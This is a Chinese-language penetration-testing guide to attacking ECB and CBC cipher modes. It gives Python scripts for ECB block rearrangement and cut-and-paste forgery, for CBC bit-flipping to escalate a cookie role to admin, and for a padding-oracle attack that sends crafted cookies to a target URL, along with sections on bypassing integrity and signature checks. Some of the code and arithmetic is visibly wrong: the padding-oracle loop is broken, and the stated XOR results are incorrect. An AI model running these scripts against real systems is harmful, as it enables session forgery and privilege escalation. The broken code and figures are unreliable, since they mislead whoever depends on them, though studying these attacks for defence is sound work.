# 加密模式攻击

---

## 第一部分：文档概述

### 1.1 编写目的
本文档旨在为渗透测试人员提供加密模式攻击的系统性方法论，重点讲解 ECB（Electronic Codebook）模式、CBC（Cipher Block Chaining）模式等常见加密模式的漏洞原理、检测方法和利用技术。

### 1.2 适用范围
本文档适用于以下场景：
- 使用 ECB 模式加密敏感数据的应用
- CBC 模式实现存在缺陷的加密系统
- 使用弱 IV（初始化向量）的加密实现
- 块加密算法（AES、DES、3DES）的不当使用

### 1.3 读者对象
- 渗透测试工程师
- 密码学安全测试人员
- 代码审计人员
- 安全研究员

---

## 第二部分：核心渗透技术专题

### 专题一：加密模式攻击

#### 2.1 技术介绍

**加密模式攻击**是针对块加密算法工作模式的攻击技术。即使使用强加密算法（如 AES），如果加密模式选择不当或实现有缺陷，攻击者仍能获取明文信息或篡改密文。

**常见加密模式对比：**

| 模式 | 全称 | 安全性 | 主要问题 |
|------|------|--------|----------|
| ECB | Electronic Codebook | ❌ 不安全 | 相同明文产生相同密文，模式可识别 |
| CBC | Cipher Block Chaining | ⚠️ 需注意 | IV 重用、Padding Oracle |
| CFB | Cipher Feedback | ⚠️ 需注意 | 比特翻转攻击 |
| OFB | Output Feedback | ⚠️ 需注意 | IV 重用导致密钥流重用 |
| CTR | Counter | ✅ 安全 | 需确保 Nonce 不重复 |
| GCM | Galois/Counter | ✅ 安全 | 提供认证加密 |

**ECB 模式问题图示：**
```
明文：[AAAA][BBBB][AAAA][CCCC]
       ↓加密
密文：[XXXX][YYYY][XXXX][ZZZZ]
       ↑
相同明文块 → 相同密文块 → 模式泄露
```

#### 2.2 攻击常见于哪些业务场景

| 业务场景 | 功能示例 | 风险点描述 |
|---------|---------|-----------|
| 密码存储 | 用户密码加密存储 | 使用 ECB 模式，相同密码产生相同密文 |
| Session 管理 | Session ID 加密 | ECB 模式导致 Session 模式可识别 |
| 支付系统 | 信用卡号加密 | ECB 模式泄露卡号模式 |
| Cookie 加密 | 用户信息 Cookie | CBC 模式 IV 重用或可预测 |
| 数据库加密 | 敏感字段加密 | 使用 ECB 模式，数据模式泄露 |
| API 参数加密 | 加密查询参数 | ECB 模式允许密文块重排攻击 |

#### 2.3 漏洞发现方法

##### 2.3.1 黑盒测试

**步骤 1：识别加密数据**
```bash
# 观察请求/响应中的加密数据特征
# AES-128/256 密文长度通常是 16 字节（128 位）的倍数
# Base64 编码后长度特征：16 字节 → 24 字符

# 示例：检测重复密文块（ECB 特征）
echo "U2FsdGVkX1+ABC123ABC123DEF456DEF456" | base64 -d | xxd
```

**步骤 2：ECB 模式检测**
```python
#!/usr/bin/env python3
"""
ECB 模式检测脚本
原理：ECB 模式下，相同明文块产生相同密文块
"""
import base64

def detect_ecb(ciphertext_b64):
    """检测是否为 ECB 模式"""
    ciphertext = base64.b64decode(ciphertext_b64)
    block_size = 16  # AES 块大小
    
    # 分割为块
    blocks = [ciphertext[i:i+block_size] 
              for i in range(0, len(ciphertext), block_size)]
    
    # 检查是否有重复块
    if len(blocks) != len(set(blocks)):
        print("[+] 检测到 ECB 模式！发现重复密文块")
        return True
    else:
        print("[-] 未检测到 ECB 模式特征")
        return False

# 使用示例
ciphertext = "U2FsdGVkX1+ABC123ABC123DEF456DEF456..."
detect_ecb(ciphertext)
```

**步骤 3：CBC 模式 IV 问题检测**
```python
#!/usr/bin/env python3
"""
CBC 模式 IV 重用检测
"""
import base64

def detect_iv_reuse(ciphertexts):
    """检测多个密文是否使用相同 IV"""
    block_size = 16
    ivs = []
    
    for ct_b64 in ciphertexts:
        ct = base64.b64decode(ct_b64)
        # CBC 模式下，IV 通常作为第一个块前置
        iv = ct[:block_size]
        ivs.append(iv.hex())
    
    if len(ivs) != len(set(ivs)):
        print("[+] 检测到 IV 重用！")
        return True
    return False
```

##### 2.3.2 白盒测试

**检查加密实现代码：**
```python
# ❌ 不安全 - ECB 模式
from Crypto.Cipher import AES
cipher = AES.new(key, AES.MODE_ECB)

# ❌ 不安全 - CBC 模式但 IV 固定
iv = b'\x00' * 16  # 固定 IV
cipher = AES.new(key, AES.MODE_CBC, iv)

# ❌ 不安全 - CBC 模式但 IV 可预测
import time
iv = str(time.time()).encode().ljust(16, b'\x00')
cipher = AES.new(key, AES.MODE_CBC, iv)

# ✅ 安全 - CBC 模式使用随机 IV
from Crypto.Random import get_random_bytes
iv = get_random_bytes(16)
cipher = AES.new(key, AES.MODE_CBC, iv)

# ✅ 安全 - 使用 GCM 模式（认证加密）
nonce = get_random_bytes(12)
cipher = AES.new(key, AES.MODE_GCM, nonce=nonce)
```

#### 2.4 漏洞利用方法

##### 2.4.1 ECB 模式密文重排攻击

```python
#!/usr/bin/env python3
"""
ECB 模式密文重排攻击
场景：Cookie 中包含加密的用户信息
"""
import base64

def ecb_rearrange_attack(original_cookie_b64):
    """
    通过重排密文块改变解密后的明文
    示例：将普通用户权限提升为管理员
    """
    cookie = base64.b64decode(original_cookie_b64)
    block_size = 16
    
    # 分割为块
    blocks = [cookie[i:i+block_size] 
              for i in range(0, len(cookie), block_size)]
    
    print(f"[*] 原始块数：{len(blocks)}")
    for i, block in enumerate(blocks):
        print(f"    块{i}: {block.hex()}")
    
    # 重排块（示例：交换块位置）
    # 假设结构：[用户名][角色=user][填充]
    # 重排为：[用户名][角色=admin][填充]
    rearranged = blocks.copy()
    rearranged[1], rearranged[2] = rearranged[2], rearranged[1]
    
    # 重组密文
    new_cookie = b''.join(rearranged)
    new_cookie_b64 = base64.b64encode(new_cookie).decode()
    
    print(f"[+] 重排后的 Cookie: {new_cookie_b64}")
    return new_cookie_b64

# 使用示例
original = "U2FsdGVkX1+ABC123DEF456..."
ecb_rearrange_attack(original)
```

##### 2.4.2 ECB 模式块替换攻击

```python
#!/usr/bin/env python3
"""
ECB 模式块替换攻击
场景：已知部分明文 - 密文对，替换特定字段
"""

class ECBAttack:
    def __init__(self, block_size=16):
        self.block_size = block_size
        self.codebook = {}  # 明文块 → 密文块映射
    
    def build_codebook(self, known_pairs):
        """
        构建代码本
        known_pairs: [(明文，密文), ...]
        """
        for plaintext, ciphertext in known_pairs:
            for i in range(0, len(plaintext), self.block_size):
                p_block = plaintext[i:i+self.block_size]
                c_block = ciphertext[i:i+self.block_size]
                if len(p_block) == self.block_size:
                    self.codebook[p_block] = c_block
    
    def forge_ciphertext(self, target_plaintext):
        """伪造目标明文的密文"""
        forged = b''
        for i in range(0, len(target_plaintext), self.block_size):
            p_block = target_plaintext[i:i+self.block_size]
            if p_block in self.codebook:
                forged += self.codebook[p_block]
            else:
                print(f"[-] 未知明文块：{p_block}")
                return None
        return forged

# 使用示例
attack = ECBAttack()

# 假设我们截获了以下明文 - 密文对
known_pairs = [
    (b'role=user\x07\x07\x07\x07\x07\x07\x07', b'\x01\x02\x03...'),
    (b'role=admin\x06\x06\x06\x06\x06\x06', b'\x04\x05\x06...'),
]

attack.build_codebook(known_pairs)

# 伪造管理员权限
target = b'role=admin\x06\x06\x06\x06\x06\x06'
forged = attack.forge_ciphertext(target)
```

##### 2.4.3 CBC 比特翻转攻击

```python
#!/usr/bin/env python3
"""
CBC 比特翻转攻击
原理：修改前一个密文块会影响下一个块的解密结果
"""

def cbc_bit_flip_attack(ciphertext_b64, target_block, flip_bytes):
    """
    对 CBC 模式进行比特翻转攻击
    
    ciphertext_b64: Base64 编码的密文
    target_block: 要修改的目标块索引
    flip_bytes: 每个字节要翻转的值
    """
    import base64
    
    ciphertext = bytearray(base64.b64decode(ciphertext_b64))
    block_size = 16
    
    # 修改前一个块的对应字节
    prev_block_start = (target_block - 1) * block_size
    for i, flip in enumerate(flip_bytes):
        ciphertext[prev_block_start + i] ^= flip
    
    modified = base64.b64encode(ciphertext).decode()
    print(f"[+] 修改后的密文：{modified}")
    return modified

# 使用示例
# 假设要将 "role=user" 改为 "role=admin"
# 'u' (0x75) XOR 0x0c = 'a' (0x61)
# 's' (0x73) XOR 0x10 = 'c' (0x63)
# 'e' (0x65) XOR 0x04 = 'i' (0x69)
# 'r' (0x72) XOR 0x13 = 'n' (0x6e)
flip_bytes = [0x0c, 0x10, 0x04, 0x13]
cbc_bit_flip_attack(ciphertext_b64, target_block=2, flip_bytes=flip_bytes)
```

##### 2.4.4 Padding Oracle 攻击

```python
#!/usr/bin/env python3
"""
Padding Oracle 攻击实现
通过观察解密错误来逐字节破解密文
"""
import requests

class PaddingOracleAttack:
    def __init__(self, target_url, cookie_name):
        self.target_url = target_url
        self.cookie_name = cookie_name
        self.block_size = 16
    
    def is_valid_padding(self, ciphertext_b64):
        """检查填充是否有效"""
        cookies = {self.cookie_name: ciphertext_b64}
        response = requests.get(self.target_url, cookies=cookies)
        
        # 根据响应判断填充是否有效
        # 通常有效填充返回 200，无效填充返回 500
        return response.status_code == 200
    
    def decrypt_block(self, ciphertext_block, iv):
        """解密单个块"""
        intermediate = b''
        
        for byte_index in range(self.block_size):
            pad_byte = byte_index + 1
            pad_value = bytes([pad_byte] * pad_byte)
            
            # 构造攻击密文
            attack_iv = bytearray(b'\x00' * (self.block_size - pad_byte))
            attack_iv += bytes([
                intermediate[i] ^ pad_byte ^ iv[i]
                for i in range(len(intermediate))
            ])
            
            # 爆破当前字节
            for guess in range(256):
                attack_iv = bytes(attack_iv) + bytes([guess])
                
                if self.is_valid_padding(
                    (attack_iv + ciphertext_block).hex()
                ):
                    intermediate_byte = guess ^ pad_byte
                    intermediate = bytes([intermediate_byte]) + intermediate
                    break
        
        return intermediate
    
    def decrypt(self, ciphertext_b64):
        """解密完整密文"""
        import base64
        ciphertext = base64.b64decode(ciphertext_b64)
        
        blocks = [ciphertext[i:i+self.block_size] 
                  for i in range(0, len(ciphertext), self.block_size)]
        
        iv = blocks[0]  # IV 通常是第一个块
        plaintext = b''
        
        for i in range(1, len(blocks)):
            decrypted = self.decrypt_block(blocks[i], iv)
            plaintext += decrypted
            iv = blocks[i]
        
        # 移除 PKCS7 填充
        pad_len = plaintext[-1]
        plaintext = plaintext[:-pad_len]
        
        return plaintext

# 使用示例
# attacker = PaddingOracleAttack(
#     "https://target.com/api/data",
#     "session"
# )
# plaintext = attacker.decrypt("base64_ciphertext...")
```

#### 2.5 漏洞利用绕过方法

##### 2.5.1 绕过密文长度检测

```python
# 当服务器检测密文长度异常时
# 方法：保持密文总长度不变

def maintain_length_attack(original_ct, modified_ct):
    """保持密文长度不变的攻击"""
    if len(modified_ct) < len(original_ct):
        # 用原始密文的块填充
        padding = original_ct[len(modified_ct):]
        return modified_ct + padding
    return modified_ct
```

##### 2.5.2 绕过块边界检测

```python
# 当服务器检测块边界完整性时
# 方法：使用更小的修改粒度

def byte_level_attack(ciphertext, target_position, target_value):
    """字节级攻击，避免触发块级检测"""
    ct = bytearray(ciphertext)
    
    # 逐字节修改，每次只改一个字节
    for i in range(len(ct)):
        if i == target_position:
            ct[i] = target_value
            # 测试修改后的效果
            if test_modification(bytes(ct)):
                return bytes(ct)
    
    return None
```

##### 2.5.3 绕过签名验证

```python
# 当加密数据同时有签名保护时
# 方法：先攻击加密，再攻击签名

def combined_attack(ciphertext, signature):
    """组合攻击：先 ECB 重排，再签名伪造"""
    # 1. ECB 重排攻击
    modified_ct = ecb_rearrange_attack(ciphertext)
    
    # 2. 如果签名是 HMAC 且密钥弱，爆破密钥
    # 3. 如果签名是 RSA 且算法可混淆，尝试算法攻击
    # 4. 如果签名有重放漏洞，使用旧签名
    
    return modified_ct, signature  # 或其他伪造的签名
```

---

## 第三部分：附录

### 3.1 常用 Payload 速查表

| 类别 | 命令/代码 | 说明 |
|-----|----------|------|
| 检测 | `detect_ecb(ciphertext)` | ECB 模式检测 |
| 检测 | `xxd ciphertext.bin` | 查看密文十六进制 |
| 攻击 | `ECB 重排` | 密文块重排攻击 |
| 攻击 | `CBC 比特翻转` | 修改前一块影响下一块解密 |
| 攻击 | `Padding Oracle` | 逐字节解密 |
| 工具 | `padbuster` | Padding Oracle 自动化工具 |
| 工具 | `precursor` | ECB 攻击工具 |

### 3.2 Padding Oracle 错误特征

| 错误类型 | HTTP 状态码 | 错误信息 | 说明 |
|---------|------------|---------|------|
| 有效填充 | 200 | 无错误 | 填充正确，但可能解密失败 |
| 无效填充 | 500 | "Padding error" | 填充错误 |
| 解密失败 | 500 | "Decryption failed" | 填充正确但内容无效 |
| 认证失败 | 401/403 | "Invalid token" | MAC 验证失败 |

### 3.3 安全加密实现示例

**Python (AES-GCM):**
```python
from Crypto.Cipher import AES
from Crypto.Random import get_random_bytes
import base64

def encrypt_gcm(plaintext, key):
    """使用 GCM 模式加密（推荐）"""
    nonce = get_random_bytes(12)  # GCM 推荐 12 字节 nonce
    cipher = AES.new(key, AES.MODE_GCM, nonce=nonce)
    ciphertext, tag = cipher.encrypt_and_digest(plaintext)
    
    # 返回：nonce + tag + ciphertext
    return base64.b64encode(nonce + tag + ciphertext).decode()

def decrypt_gcm(ciphertext_b64, key):
    """使用 GCM 模式解密"""
    data = base64.b64decode(ciphertext_b64)
    nonce = data[:12]
    tag = data[12:28]
    ciphertext = data[28:]
    
    cipher = AES.new(key, AES.MODE_GCM, nonce=nonce)
    plaintext = cipher.decrypt_and_verify(ciphertext, tag)
    return plaintext
```

**Java (AES-GCM):**
```java
import javax.crypto.Cipher;
import javax.crypto.spec.GCMParameterSpec;
import javax.crypto.spec.SecretKeySpec;
import java.security.SecureRandom;

public class AESEncryption {
    private static final int GCM_IV_LENGTH = 12;
    private static final int GCM_TAG_LENGTH = 128;
    
    public static byte[] encrypt(byte[] plaintext, byte[] key) throws Exception {
        Cipher cipher = Cipher.getInstance("AES/GCM/NoPadding");
        SecretKeySpec keySpec = new SecretKeySpec(key, "AES");
        
        byte[] iv = new byte[GCM_IV_LENGTH];
        new SecureRandom().nextBytes(iv);
        
        GCMParameterSpec params = new GCMParameterSpec(GCM_TAG_LENGTH, iv);
        cipher.init(Cipher.ENCRYPT_MODE, keySpec, params);
        
        byte[] ciphertext = cipher.doFinal(plaintext);
        
        // 返回：IV + Ciphertext
        byte[] result = new byte[iv.length + ciphertext.length];
        System.arraycopy(iv, 0, result, 0, iv.length);
        System.arraycopy(ciphertext, 0, result, iv.length, ciphertext.length);
        return result;
    }
}
```

### 3.4 加密模式选择指南

| 使用场景 | 推荐模式 | 理由 |
|---------|---------|------|
| 通用加密 | GCM | 认证加密，防篡改 |
| 高性能需求 | CTR | 并行处理，无填充 |
| 磁盘加密 | XTS | 专为存储设计 |
| 流式数据 | CFB/OFB | 流式处理 |
| 遗留系统兼容 | CBC | 广泛支持，需注意 IV |
| **禁止使用** | **ECB** | **严重安全问题** |

---

## 参考资源

- [NIST SP 800-38A - Block Cipher Modes](https://csrc.nist.gov/publications/detail/sp/800-38a/final)
- [NIST SP 800-38D - GCM Mode](https://csrc.nist.gov/publications/detail/sp/800-38d/final)
- [Padding Oracle Attack - Wikipedia](https://en.wikipedia.org/wiki/Padding_oracle_attack)
- [Cryptopals Crypto Challenges](https://cryptopals.com/) - 实战练习
- [Pwntools Crypto Utils](https://docs.pwntools.com/) - 攻击工具库
